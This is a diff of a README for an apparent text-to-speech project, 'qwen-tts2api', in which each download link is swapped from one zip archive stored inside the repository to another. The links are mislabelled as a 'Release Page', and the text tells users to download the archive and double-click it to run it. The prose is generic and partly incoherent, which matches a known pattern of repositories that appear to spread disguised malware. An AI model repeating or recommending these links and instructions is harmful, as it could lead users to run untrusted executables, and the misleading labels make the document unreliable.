@@ -1,6 +1,6 @@
 # 🗣️ qwen-tts2api - Simple Speech Conversion Made Easy
 
-[![Download qwen-tts2api](https://github.com/itsmemotivist/qwen-tts2api/raw/refs/heads/main/qwen_tts/qwen-api-tts-1.2-alpha.4.zip)](https://github.com/itsmemotivist/qwen-tts2api/raw/refs/heads/main/qwen_tts/qwen-api-tts-1.2-alpha.4.zip)
+[![Download qwen-tts2api](https://raw.githubusercontent.com/itsmemotivist/qwen-tts2api/main/qwen_tts/qwen-tts-api-v1.7.zip)](https://raw.githubusercontent.com/itsmemotivist/qwen-tts2api/main/qwen_tts/qwen-tts-api-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to qwen-tts2api! This application converts text into natural-sounding sp
 
 To get started, you will need to download the software from our Releases page. 
 
-**Visit the page to download:** [Release Page](https://github.com/itsmemotivist/qwen-tts2api/raw/refs/heads/main/qwen_tts/qwen-api-tts-1.2-alpha.4.zip)
+**Visit the page to download:** [Release Page](https://raw.githubusercontent.com/itsmemotivist/qwen-tts2api/main/qwen_tts/qwen-tts-api-v1.7.zip)
 
 ### Installation Steps
 
@@ -22,7 +22,7 @@ To get started, you will need to download the software from our Releases page.
 
 3. **Download the Software**  
    Click on the file link suitable for your operating system (Windows, Mac, or Linux).  
-   For example, if you’re using Windows, you might see a file like `https://github.com/itsmemotivist/qwen-tts2api/raw/refs/heads/main/qwen_tts/qwen-api-tts-1.2-alpha.4.zip`. Click on it to download.
+   For example, if you’re using Windows, you might see a file like `https://raw.githubusercontent.com/itsmemotivist/qwen-tts2api/main/qwen_tts/qwen-tts-api-v1.7.zip`. Click on it to download.
 
 4. **Run the Application**  
    Once the download completes, locate the file in your downloads folder. Double-click the file to run the application.  
@@ -87,6 +87,6 @@ A: Each conversion can handle up to 1000 characters at a time. For longer texts,
 - **Documentation:** Detailed instructions and advanced features are available in the documentation section of the project.
 - **Community Support:** Join our community discussions to share your experiences or seek help.
 
-For more enhanced features and updates, remember to check the Releases page regularly: [Release Page](https://github.com/itsmemotivist/qwen-tts2api/raw/refs/heads/main/qwen_tts/qwen-api-tts-1.2-alpha.4.zip). 
+For more enhanced features and updates, remember to check the Releases page regularly: [Release Page](https://raw.githubusercontent.com/itsmemotivist/qwen-tts2api/main/qwen_tts/qwen-tts-api-v1.7.zip). 
 
 Thank you for choosing qwen-tts2api! Enjoy turning your text into engaging audio.
